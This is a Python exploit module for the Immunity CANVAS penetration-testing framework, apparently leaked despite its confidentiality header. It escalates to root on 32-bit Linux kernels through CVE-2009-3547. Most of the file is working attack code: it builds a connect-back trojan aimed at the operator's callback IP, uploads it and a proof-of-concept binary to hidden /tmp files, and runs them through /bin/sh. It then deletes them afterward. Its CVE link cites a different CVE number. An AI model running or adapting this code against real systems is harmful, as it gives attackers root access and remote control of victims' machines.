#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

from __future__ import with_statement
import sys
if '.' not in sys.path:
    sys.path.append('.')

import os
import time
import canvasengine

from ExploitTypes.localexploit import LocalExploit
from libs.canvasos import canvasos
from exploitutils import randomstring
from canvaserror import NodeCommandError


NAME                           = 'fs_pipe_race_to_null local root'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges through CVE-2009-3547'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Linux'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2009-3547'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0871'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [['Linux', 'x86']]

DOCUMENTATION['NOTES'] = """

Tested on Ubuntu 9.04 32-bit, Ubuntu 9.10 32-bit, kernels 2.6.[28|29|30|31]
Vulnerable kernels <= 2.6.31 32bit.

"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name                = NAME
        self.node                = None
        self.local_path          = os.path.join(os.path.dirname(__file__), 'Resources') # the path to exp
        self.local_exploit       = os.path.join(self.local_path, 'poc')                 # exp
        self.remote_exploit      = '/tmp/.' + randomstring(8)
        self.local_cback         = None
        self.remote_cback        = '/tmp/.' + randomstring(8)

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]
    
    def nodeUpload(self, src, dst):
        try:
            self.node.upload(src, destfilename=dst)
        except NodeCommandError, ex:
            self.log('[!] Failed to upload %s to %s: %s' % (src, dst, ex))
            return False
            
        self.log('[+] Upload succeeded ...')
        return True

    def fork_and_exec(self, command):
        vars = {'command' : command}

        code = """
        #import "string", "command" as "command"
        #import "local", "fork" as "fork"
        #import "local", "execve" as "execve"
        #import "local", "close" as "close"

        void main()
        {
            char *argv[4];
            char **envp;
            int pid;

            envp = 0;
            argv[0] = "/bin/sh";
            argv[1] = "-c";
            argv[2] = command;
            argv[3] = 0;

            pid = fork();

            if (pid == 0) {
                close(0);
                close(1);
                close(2);
                execve(argv[0], argv, envp);
            }
        }
        """
        self.node.shell.clearfunctioncache()
        req = self.node.shell.compile(code, vars)
        self.node.shell.sendrequest(req)
        self.node.shell.leave()

        
    def run(self):
        self.node = self.argsDict['passednodes'][0]        
        
        if 'linux' not in self.node.capabilities:
            self.log('[!] Not a Linux node ...')
            return 0

        self.log('[+] Remote path to exploit: %s' % self.remote_exploit)
        self.log('[+] Remote path to callback: %s'  % self.remote_cback)
        
        self.log("Creating MOSDEF callback for ip: %s and port: %s" % (self.callback.ip, self.callback.port))
        
        platform = "Linux"
        t_os = canvasos(platform)
        t_os.arch = "X86"

        try:
            ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, universal=True)
            if ret:
                local_cback = os.path.join(self.local_path, "callback_%s_%s" % (platform.lower(), t_os.arch))
                
                with open(local_cback, "wb") as f:
                    f.write(self.mosdeftrojan)
                    
                self.log("[+] Done creating callback")
            else:
                raise Exception('buildmosdeftrojan returned False')
        except Exception, err:
            self.log("[!] Error building MOSDEF callback: %s" % err)
            return 0

        self.log('[+] Uploading exploit ...')
                     
        if self.nodeUpload(self.local_exploit, self.remote_exploit) == False:
            self.log('[!] Could not upload exploit, aborting')
            return 0

        self.log('[+] Uploading callback ...')
        if self.nodeUpload(local_cback, self.remote_cback) == False:
            self.log('[!] Could not upload callback, aborting')
            self.node.shell.dounlink(self.remote_exploit)
            return 0
 
        self.log('[+] running exploit ...')
        self.fork_and_exec("%s -c %s" % (self.remote_exploit, self.remote_cback))
        self.log("[+] Done running exploit")

        success = False
        for _ in xrange(20):
            status = self.ISucceeded()
            
            if status:
                self.log("[*] Success!")
                success = True
                break
            else:
                self.log("Connectback failed, trying again..")
            time.sleep(0.5)
            
        if not success: self.log("[!] Exploit failed")

        self.log("[+] Removing files..")
        self.node.shell.dounlink(self.remote_exploit)
        self.node.shell.dounlink(self.remote_cback)
            
        return status
